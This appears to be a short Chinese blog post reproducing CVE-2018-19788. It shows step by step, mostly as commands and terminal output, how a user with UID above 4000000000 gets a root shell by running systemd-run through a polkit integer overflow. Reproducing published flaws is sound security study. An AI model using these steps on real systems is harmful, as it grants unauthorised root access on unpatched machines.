---
title: cve-2018-19788
date: 2022-01-28 15:13:13
tags:
- CVE
- polkit
---

## CVE-2018-19788复现方法

这个漏洞是任何uid超过4000000000的用户可以在系统上直接执行systemd的命令，复现方法如下

先创建一个uid超过4000000000的用户

```
root@nfs2:~# adduser -u 4000000000 wky2
正在添加用户"wky2"...
正在添加新组"wky2" (4000000000)...
正在添加新用户"wky2" (4000000000) 到组"wky2"...
创建主目录"/home/wky2"...
正在从"/etc/skel"复制文件...
输入新的 UNIX 密码：
重新输入新的 UNIX 密码：
passwd：已成功更新密码
正在改变 wky2 的用户信息
请输入新值，或直接敲回车键以使用默认值
	全名 []:
	房间号码 []:
	工作电话 []:
	家庭电话 []:
	其它 []:
这些信息是否正确？ [Y/n]
root@nfs2:~#
```

切换到新创建的用户，用户uid为4000000000

```
root@nfs2:~# su - wky2
wky2@nfs2:~$ id
uid=4000000000(wky2) gid=4000000000(wky2) 组=4000000000(wky2)
```

执行下面的命令，就会直接切到root用户

```
wky2@nfs2:~$ systemd-run -t /bin/bash

(process:121458): GLib-GObject-WARNING **: value "-294967296" of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
**
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
Running as unit: run-u95.service
Press ^] three times within 1s to disconnect TTY.
root@nfs2:/#id
uid=0(root) gid=0(root) 组=0(root)
root@nfs2:/# uid=0(root) gid=0(root) 组=0(root)
```

